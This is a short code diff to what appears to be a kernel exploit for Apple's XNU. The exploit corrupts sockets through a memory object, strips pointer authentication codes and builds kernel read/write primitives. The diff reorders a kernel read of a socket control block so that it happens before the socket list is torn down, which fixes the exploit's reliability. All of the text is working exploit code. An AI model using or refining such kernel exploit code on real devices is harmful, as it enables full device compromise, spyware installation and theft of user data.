@@ -710,6 +710,9 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 		}
 		printf("[+] controlSocket idx=%d fd=%d, rwSocket fd=%d\n", controlSocketIdx, controlSocket, rwSocket);
 		fflush(stdout);
+		// read controlSocketPcb NOW while inp_list is intact (sockets_release will tear it down)
+		controlSocketPcb = __xpaci(early_kread64(rwSocketPcb + OFFSET_PCB_LIST_NEXT));
+		printf("[i] controlSocketPcb=%#llx\n", controlSocketPcb); fflush(stdout);
 		return KERN_SUCCESS;
 	}
 	return -1;
@@ -904,7 +907,7 @@ int main(int argc, char* argv[])
 	close(writeFd);
 	close(readFd);
 
-	controlSocketPcb = __xpaci(early_kread64(rwSocketPcb + OFFSET_PCB_LIST_NEXT));
+	// controlSocketPcb already read inside find_and_corrupt_socket (before sockets_release)
 	printf("[i] controlSocketPcb=%#llx rwSocketPcb=%#llx\n", controlSocketPcb, rwSocketPcb); fflush(stdout);
 
 	krw_sockets_leak_forever();
